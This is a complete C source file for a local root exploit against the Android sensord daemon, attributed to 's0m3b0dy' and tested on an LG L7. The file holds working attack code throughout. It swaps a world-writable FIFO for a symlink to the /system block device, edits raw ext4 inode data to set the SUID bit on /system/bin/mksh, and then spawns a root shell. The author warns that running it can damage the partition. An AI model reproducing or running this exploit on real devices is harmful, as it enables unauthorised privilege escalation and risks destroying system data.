/*
 * Android sensord 0day root exploit by s0m3b0dy
 * tested on LG L7 (PL)
 *
 *
 * need pentests? s0m3b0dy1(at)gmail.com
 *
 * * * * * * * * * * * * * * * * * * * * * * * *
 *
 * some Android devices have sensord deamon,
 * for some ROMs the deamon is running as root process(there we can use this exploit)
 *
 * and
 *---------
 * root@android:/ # strace sensord
 * ...
 * open("/data/misc/sensor/fifo_cmd", O_RDWR|O_LARGEFILE) = 12
 * ...
 * open("/data/misc/sensor/fifo_dat", O_RDWR|O_LARGEFILE) = 13
 * fchmod(12, 0666)                        = 0
 * fchmod(13, 0666)                        = 0
 * ---------
 * there is no check that the files are not links, so we can link it to eg. block device and make it rw!
 * exploit will set bit suid on /system/bin/mksh, need to reboot the device after step 1 and step 2
 *
 * this exploit is dangerous, before step 1 exploit is disabling auto-rotate to not overwrite /system pertition!
 *
 * the author is not responsible for any damage
 * for education purpose only :)
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <ctype.h>


#define FIFO_DAT "/data/misc/sensor/fifo_dat"
#define SH "/system/bin/mksh"

struct ext4_super_block {
 /*00*/  __le32  s_inodes_count;
         __le32  s_blocks_count_lo;
         __le32  s_r_blocks_count_lo;
         __le32  s_free_blocks_count_lo;
 /*10*/  __le32  s_free_inodes_count;
         __le32  s_first_data_block;
         __le32  s_log_block_size;
         __le32  s_log_cluster_size;
 /*20*/  __le32  s_blocks_per_group;
         __le32  s_clusters_per_group;
         __le32  s_inodes_per_group;
         __le32  s_mtime;
 /*30*/  __le32  s_wtime;
         __le16  s_mnt_count;
         __le16  s_max_mnt_count;
         __le16  s_magic;
         __le16  s_state;
         __le16  s_errors;
         __le16  s_minor_rev_level;
 /*40*/  __le32  s_lastcheck;
         __le32  s_checkinterval;
         __le32  s_creator_os;
         __le32  s_rev_level;
 /*50*/  __le16  s_def_resuid;
         __le16  s_def_resgid;
         __le32  s_first_ino;
         __le16  s_inode_size;
         __le16  s_block_group_nr;
         __le32  s_feature_compat;
 /*60*/  __le32  s_feature_incompat;
         __le32  s_feature_ro_compat;
 /*68*/  __u8    s_uuid[16];
 /*78*/  char    s_volume_name[16];
 /*88*/  char    s_last_mounted[64];
 /*C8*/  __le32  s_algorithm_usage_bitmap;
         __u8    s_prealloc_blocks;
         __u8    s_prealloc_dir_blocks;
         __le16  s_reserved_gdt_blocks;
 /*D0*/  __u8    s_journal_uuid[16];
 /*E0*/  __le32  s_journal_inum;
         __le32  s_journal_dev;
         __le32  s_last_orphan;
         __le32  s_hash_seed[4];
         __u8    s_def_hash_version;
         __u8    s_jnl_backup_type;
         __le16  s_desc_size;
 /*100*/ __le32  s_default_mount_opts;
         __le32  s_first_meta_bg;
         __le32  s_mkfs_time;
         __le32  s_jnl_blocks[17];
 /*150*/ __le32  s_blocks_count_hi;
         __le32  s_r_blocks_count_hi;
         __le32  s_free_blocks_count_hi;
         __le16  s_min_extra_isize;
         __le16  s_want_extra_isize;
         __le32  s_flags;
         __le16  s_raid_stride;
         __le16  s_mmp_update_interval;
         __le64  s_mmp_block;
         __le32  s_raid_stripe_width;
         __u8    s_log_groups_per_flex;
         __u8    s_checksum_type;
         __u8    s_encryption_level;
         __u8    s_reserved_pad;
         __le64  s_kbytes_written;
         __le32  s_snapshot_inum;
         __le32  s_snapshot_id;
         __le64  s_snapshot_r_blocks_count;
         __le32  s_snapshot_list;
 #define EXT4_S_ERR_START offsetof(struct ext4_super_block, s_error_count)
         __le32  s_error_count;
         __le32  s_first_error_time;
         __le32  s_first_error_ino;
         __le64  s_first_error_block;
         __u8    s_first_error_func[32];
         __le32  s_first_error_line;
         __le32  s_last_error_time;
         __le32  s_last_error_ino;
         __le32  s_last_error_line;
         __le64  s_last_error_block;
         __u8    s_last_error_func[32];
 #define EXT4_S_ERR_END offsetof(struct ext4_super_block, s_mount_opts)
         __u8    s_mount_opts[64];
         __le32  s_usr_quota_inum;
         __le32  s_grp_quota_inum;
         __le32  s_overhead_clusters;
         __le32  s_backup_bgs[2];
         __u8    s_encrypt_algos[4];
         __u8    s_encrypt_pw_salt[16];
         __le32  s_lpf_ino;
         __le32  s_prj_quota_inum;
         __le32  s_checksum_seed;
         __le32  s_reserved[98];
        __le32  s_checksum;
};

struct ext4_group_desc
{
         __le32  bg_block_bitmap_lo;
         __le32  bg_inode_bitmap_lo;
         __le32  bg_inode_table_lo;
         __le16  bg_free_blocks_count_lo;
         __le16  bg_free_inodes_count_lo;
         __le16  bg_used_dirs_count_lo;
         __le16  bg_flags;
         __le32  bg_exclude_bitmap_lo;
         __le16  bg_block_bitmap_csum_lo;
         __le16  bg_inode_bitmap_csum_lo;
         __le16  bg_itable_unused_lo;
         __le16  bg_checksum;
         __le32  bg_block_bitmap_hi;
         __le32  bg_inode_bitmap_hi;
         __le32  bg_inode_table_hi;
         __le16  bg_free_blocks_count_hi;
         __le16  bg_free_inodes_count_hi;
         __le16  bg_used_dirs_count_hi;
         __le16  bg_itable_unused_hi;
         __le32  bg_exclude_bitmap_hi;
         __le16  bg_block_bitmap_csum_hi;
         __le16  bg_inode_bitmap_csum_hi;
         __u32   bg_reserved;
 };

struct ext4_inode {
         __le16  i_mode;
         __le16  i_uid;
         __le32  i_size_lo;
         __le32  i_atime;
         __le32  i_ctime;
         __le32  i_mtime;
         __le32  i_dtime;
         __le16  i_gid;
         __le16  i_links_count;
         __le32  i_blocks_lo;
         __le32  i_flags;
         union {
                 struct {
                         __le32  l_i_version;
                 } linux1;
                 struct {
                         __u32  h_i_translator;
                 } hurd1;
                 struct {
                         __u32  m_i_reserved1;
                 } masix1;
         } osd1;
         __le32  i_block[15];
         __le32  i_generation;
         __le32  i_file_acl_lo;
         __le32  i_size_high;
         __le32  i_obso_faddr;
         union {
                 struct {
                         __le16  l_i_blocks_high;
                         __le16  l_i_file_acl_high;
                         __le16  l_i_uid_high;
                         __le16  l_i_gid_high;
                         __le16  l_i_checksum_lo;
                         __le16  l_i_reserved;
                 } linux2;
                 struct {
                         __le16  h_i_reserved1;
                         __u16   h_i_mode_high;
                         __u16   h_i_uid_high;
                         __u16   h_i_gid_high;
                         __u32   h_i_author;
                 } hurd2;
                 struct {
                         __le16  h_i_reserved1;
                         __le16  m_i_file_acl_high;
                         __u32   m_i_reserved2[2];
                 } masix2;
         } osd2;
         __le16  i_extra_isize;
         __le16  i_checksum_hi;
         __le32  i_ctime_extra;
         __le32  i_mtime_extra;
         __le32  i_atime_extra;
         __le32  i_crtime;
         __le32  i_crtime_extra;
         __le32  i_version_hi;
 };

void print_usage( char ** argv)
{
    printf("Have 3 steps. You need to reboot the device after step 1 and step 2.\n");
    printf("Usage: %s 1\n", argv[0]);
    printf("       %s 2\n", argv[0]);
    printf("       %s 3\n", argv[0]);
    printf("       %s verify\n", argv[0]);
}

void get_system_dev( char *ptr, int size )
{
    int fd = open("/proc/mounts", O_RDONLY);
    int pos = 0, posend = 0, tmppos = 0;
    char buff[4096];
    char link[1024];
    memset(buff, 0, sizeof(buff));
    memset(link, 0, sizeof(link));
    memset(ptr, 0, size);
    if(fd != -1)
    {
        read(fd, &buff, sizeof(buff));
        int sres = (int)strstr(buff, " /system ");
        if( (sres != -1) && ((pos = (sres - (int)buff)) > 0) )
        {
            tmppos = pos;
            int i=0;
            while( (buff[pos] != '\n') && (pos > 0) ) pos--;
            pos++;
            strncpy(link, &buff[pos], tmppos - pos);
            readlink(link, ptr, size);

        }
        else
        {
            printf("[-] Can't find system partition!\n");
            close(fd);
            exit(0);
        }
        close(fd);
    }
    else
    {
        printf("[-] Can't read /proc/mounts file!\n");
        exit(0);
    }

}

void first_step()
{
    if( access(FIFO_DAT, F_OK) != -1 )
    {
        unlink(FIFO_DAT);
    }


    char path[1024];
    get_system_dev(path, sizeof(path));
    symlink(path, FIFO_DAT);

    printf("[+] Symlink is created, please reboot device and run second step.\n[+] The device may slow down, after second step will work normally.\n");
}

void second_step()
{
    char path[1024];
    struct stat s;

    unlink(FIFO_DAT);

    stat(SH, &s);
    printf("[+] Looking for inode no.: %llu\n", s.st_ino);

    get_system_dev(path, sizeof(path));

    int fd = open(path, O_RDWR);
    if( fd != -1 )
    {
        int inodeno = s.st_ino;
        struct ext4_super_block super;
        struct ext4_group_desc group_descr;
        struct ext4_inode inode;

        unsigned long int offset=0;
        lseek(fd, 0x400, SEEK_SET);

        read(fd, &super, sizeof(super));

        int block_size = 1024 << super.s_log_block_size;
        int bg = (inodeno-1) /super.s_inodes_per_group;

        lseek(fd, block_size + bg * (super.s_desc_size ? super.s_desc_size : sizeof(struct ext4_group_desc) ), SEEK_SET);
        read(fd, &group_descr, sizeof(group_descr));


        unsigned int index = (inodeno-1) % super.s_inodes_per_group;
        unsigned int off = index *  super.s_inode_size;
        unsigned long total_offset = block_size + (group_descr.bg_inode_table_lo-1) * block_size + off;

        lseek(fd, total_offset, SEEK_SET);
        read(fd, &inode, sizeof(struct ext4_inode));

        if(inode.i_size_lo == s.st_size) {
            __le16 mode = 0;
            printf("[+] Found inode!\n");
            lseek(fd, total_offset, SEEK_SET);

            inode.i_mode = inode.i_mode | 0x800;

            int modesize = sizeof(inode.i_mode);
            int wr = write(fd, &inode.i_mode, modesize);

            if( wr == modesize )
            {
                printf("[+] Success, bit SUID is setted on %s\n[+] You must reboot the device to run third step\n", SH);
            }
            else
            {
                printf("[-] Can't set bit SUID on %s\n", SH);
            }
        }
        else
        {
            printf("[-] Can't find inode!\n");
        }
        close(fd);
    }
    else
        printf("[-] Can't open %s!\n", path);

}

void third_step()
{
    char path[1024];
    //chmod(SH, 4755);
    setuid(0);
    setgid(0);
    if(getuid() == 0)
    {

        get_system_dev(path, sizeof(path));
        chmod(path, 0600);
        printf("[+] Rooted!\n");
        system(SH);
    }
    else
    {
        printf("[-] No root here!\n");
        exit(0);
    }
}

bool isSensord(char *spath)
{
    char buff[50];
    bool res = false;
    int fd = open(spath, O_RDONLY);
    if(fd != -1)
    {
        read(fd, buff, 50);
        if(strstr(buff, "/system/bin/sensord") != NULL)
        {
            res = true;
        }
        close(fd);
    }
    return res;
}

bool verify()
{
    DIR* dir;
    struct dirent *entry;
    char spath[512];
    bool res = false;
    struct stat s;

    dir = opendir("/proc");
    if(dir) {
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR) {
                snprintf(spath, 512, "/proc/%s/cmdline", entry->d_name);

                if (isSensord(spath)) {
                    stat(spath, &s);
                    if (s.st_uid == 0)
                        res = true;

                    break;
                }
            }
        }
        closedir(dir);
    }
    return res;
}

void disable_autorotate()
{
    printf("[+] Disabling auto-rotate...\n");
    system("content insert --uri content://settings/system --bind name:s:accelerometer_rotation --bind value:i:0");
}

int main(int argc, char **argv)
{

    if(argc != 2)
    {
        print_usage( argv );
        return 0;
    }

    if( strstr( argv[1], "1" ) != NULL) {
        if( verify() ) {
            disable_autorotate();
            first_step();                       //create link
        }
        else
        {
            printf("[-] It looks likey is not vulnerable!\n");
        }
    }
    else if( strstr( argv[1], "2") != NULL) {
        second_step();                          //edit ext4(/system) partition(set bit suid)
    }
    else if( strstr( argv[1], "3") != NULL) {
        third_step();                           //get root shell
    }
    else if( strstr( argv[1], "verify") != NULL){
        if( verify() )
            printf("[+] Should be vulnerable!\n");
        else
            printf("[-] Not vulnerable!\n");
    }
    else{
            print_usage( argv );
    }



    return 0;
}